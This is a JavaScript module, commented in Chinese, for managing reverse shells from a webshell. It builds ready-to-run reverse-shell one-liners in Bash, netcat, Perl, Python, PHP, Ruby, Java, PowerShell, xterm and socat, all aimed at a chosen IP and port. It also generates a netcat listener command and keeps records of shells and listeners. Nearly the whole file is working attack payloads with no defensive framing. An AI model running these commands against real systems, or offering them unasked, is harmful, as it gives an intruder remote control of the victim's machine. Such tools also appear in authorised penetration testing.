/**
 * Webshell 反弹 Shell 管理模块
 */

const WebshellReverse = (function() {
    // 反弹 Shell 列表
    let reverseShells = [];

    // 监听器列表
    let listeners = [];

    // 反弹 Shell 类型
    const SHELL_TYPES = {
        BASH: 'bash',
        NETCAT: 'nc',
        PERL: 'perl',
        PYTHON: 'python',
        PYTHON3: 'python3',
        PHP: 'php',
        RUBY: 'ruby',
        JAVA: 'java',
        POWERSHELL: 'powershell',
        XTERM: 'xterm',
        SOCAT: 'socat'
    };

    // 反弹 Shell 命令模板
    const SHELL_COMMANDS = {
        [SHELL_TYPES.BASH]: {
            name: 'Bash TCP',
            command: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
            description: '使用 Bash 内置的 /dev/tcp 进行反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.BASH + '_exec']: {
            name: 'Bash Exec',
            command: (ip, port) => `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
            description: 'Bash Exec 方式反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.NETCAT]: {
            name: 'Netcat (传统)',
            command: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
            description: '使用 Netcat -e 参数 (需要 nc 支持 -e)',
            requiresRoot: false
        },
        [SHELL_TYPES.NETCAT + '_fifo']: {
            name: 'Netcat FIFO',
            command: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
            description: 'Netcat 使用命名管道 (更通用)',
            requiresRoot: false
        },
        [SHELL_TYPES.PERL]: {
            name: 'Perl',
            command: (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
            description: '使用 Perl 反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.PYTHON]: {
            name: 'Python 2',
            command: (ip, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
            description: '使用 Python 2 反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.PYTHON3]: {
            name: 'Python 3',
            command: (ip, port) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
            description: '使用 Python 3 反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.PHP]: {
            name: 'PHP',
            command: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
            description: '使用 PHP 反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.PHP + '_shell']: {
            name: 'PHP Shell',
            command: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});$shell="/bin/sh";$handle=popen($shell,"r");while(!feof($handle)){$line=fgets($handle);fputs($sock,$line);}pclose($handle);'`,
            description: 'PHP Shell 方式反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.RUBY]: {
            name: 'Ruby',
            command: (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
            description: '使用 Ruby 反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.JAVA]: {
            name: 'Java',
            command: (ip, port) => `Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/${ip}/${port} 0>&1"});`,
            description: '使用 Java 反弹',
            requiresRoot: false
        },
        [SHELL_TYPES.POWERSHELL]: {
            name: 'PowerShell',
            command: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
            description: '使用 PowerShell 反弹 (Windows)',
            requiresRoot: false
        },
        [SHELL_TYPES.XTERM]: {
            name: 'Xterm',
            command: (ip, port) => `xterm -display ${ip}:${port}`,
            description: '使用 Xterm 反弹 (需要 X11)',
            requiresRoot: false
        },
        [SHELL_TYPES.SOCAT]: {
            name: 'Socat',
            command: (ip, port) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
            description: '使用 Socat 反弹',
            requiresRoot: false
        }
    };

    // 获取所有反弹 Shell 类型
    function getShellTypes() {
        return Object.entries(SHELL_COMMANDS).map(([key, value]) => ({
            id: key,
            name: value.name,
            description: value.description,
            requiresRoot: value.requiresRoot
        }));
    }

    // 生成反弹 Shell 命令
    function generateShellCommand(type, ip, port) {
        const template = SHELL_COMMANDS[type] || SHELL_COMMANDS[SHELL_TYPES.BASH];
        return template.command(ip, port);
    }

    // 添加反弹 Shell 记录
    function addReverseShell(config) {
        const shell = {
            id: Date.now().toString(36),
            type: config.type,
            ip: config.ip,
            port: config.port,
            command: generateShellCommand(config.type, config.ip, config.port),
            status: 'pending',
            createdAt: new Date().toISOString(),
            notes: config.notes || ''
        };
        reverseShells.push(shell);
        return shell;
    }

    // 更新反弹 Shell 状态
    function updateShellStatus(id, status) {
        const shell = reverseShells.find(s => s.id === id);
        if (shell) {
            shell.status = status;
            shell.updatedAt = new Date().toISOString();
        }
        return shell;
    }

    // 删除反弹 Shell 记录
    function deleteReverseShell(id) {
        const index = reverseShells.findIndex(s => s.id === id);
        if (index > -1) {
            reverseShells.splice(index, 1);
            return true;
        }
        return false;
    }

    // 获取所有反弹 Shell
    function getReverseShells() {
        return [...reverseShells];
    }

    // 添加监听器
    function addListener(config) {
        const listener = {
            id: Date.now().toString(36),
            port: config.port,
            status: 'stopped',
            createdAt: new Date().toISOString(),
            connections: 0
        };
        listeners.push(listener);
        return listener;
    }

    // 启动监听器
    function startListener(id) {
        const listener = listeners.find(l => l.id === id);
        if (listener) {
            listener.status = 'listening';
            listener.startedAt = new Date().toISOString();
        }
        return listener;
    }

    // 停止监听器
    function stopListener(id) {
        const listener = listeners.find(l => l.id === id);
        if (listener) {
            listener.status = 'stopped';
            listener.stoppedAt = new Date().toISOString();
        }
        return listener;
    }

    // 删除监听器
    function deleteListener(id) {
        const index = listeners.findIndex(l => l.id === id);
        if (index > -1) {
            listeners.splice(index, 1);
            return true;
        }
        return false;
    }

    // 获取所有监听器
    function getListeners() {
        return [...listeners];
    }

    // 快速生成监听命令
    function getListenerCommand(port) {
        return `nc -lvnp ${port}`;
    }

    // 公开 API
    return {
        SHELL_TYPES,
        SHELL_COMMANDS,
        getShellTypes,
        generateShellCommand,
        addReverseShell,
        updateShellStatus,
        deleteReverseShell,
        getReverseShells,
        addListener,
        startListener,
        stopListener,
        deleteListener,
        getListeners,
        getListenerCommand
    };
})();

// 导出模块
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WebshellReverse;
}
